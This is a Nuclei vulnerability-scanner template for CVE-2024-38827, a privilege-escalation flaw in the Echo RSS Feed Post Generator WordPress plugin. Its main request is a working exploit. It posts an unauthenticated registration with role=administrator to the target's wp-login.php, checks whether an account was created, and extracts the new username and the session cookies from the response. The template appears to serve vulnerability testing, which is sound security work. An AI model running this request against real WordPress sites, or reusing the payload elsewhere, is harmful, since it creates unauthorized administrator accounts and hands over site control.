id: CVE-2024-38827

info:
  name: Echo RSS Feed Post Generator <= 5.4.6 - Unauthenticated Privilege Escalation
  author: intelligent-ears
  tags: cve,cve2024,wordpress,wp-plugin,unauth,privesc,echo-rss
  reference:
    - https://codecanyon.net/item/echo-rss-feed-post-generator-plugin-for-wordpress/19486974
    - https://www.wordfence.com/threat-intel/vulnerabilities/id/c099f401-4b05-4532-8e31-af1b1dea7eca?source=cve
  severity: critical
  description: |
    The Echo RSS Feed Post Generator plugin for WordPress is vulnerable to privilege escalation in all versions up to, and including, 5.4.6. This is due to the plugin not properly restricting the roles that can be set during registration through the echo_check_post_header_sent() function. This makes it possible for unauthenticated attackers to register as an administrator.

http:
  - raw:
      - |
        GET /wp-content/plugins/rss-feed-post-generator-echo/readme.txt HTTP/1.1
        Host: {{Hostname}}

      - |
        POST /wp-login.php?action=register HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        user_name=nuclei-test-{{randstr}}&user_email=nuclei-test-{{randstr}}@example.com&role=administrator&echo_register_nonce=1&redirect_to=

    req-condition: true

    matchers-condition: and
    matchers:
      - type: dsl
        name: plugin-present
        dsl:
          - 'contains(body_1, "Echo RSS") || contains(body_1, "echo-rss") || status_code_1 == 200'

      - type: dsl
        name: registration-possible
        dsl:
          - 'status_code_2 == 200 || status_code_2 == 302'
          - '!contains(tolower(body_2), "registration=disabled")'
          - '!contains(tolower(body_2), "registration is currently disabled")'
          - '!contains(tolower(body_2), "not allowed to register")'
        condition: and

      - type: dsl
        name: exploitation-success
        dsl:
          - 'contains(tolower(header_2), "wordpress_logged_in") || contains(tolower(body_2), "registration complete") || contains(tolower(body_2), "check your email") || contains(tolower(body_2), "dashboard")'

    extractors:
      - type: regex
        name: username-created
        part: body
        regex:
          - 'Username: ([a-zA-Z0-9_-]+)'
          - 'nuclei-test-([a-z0-9]+)'

      - type: kval
        name: cookies
        part: header
        kval:
          - Set-Cookie
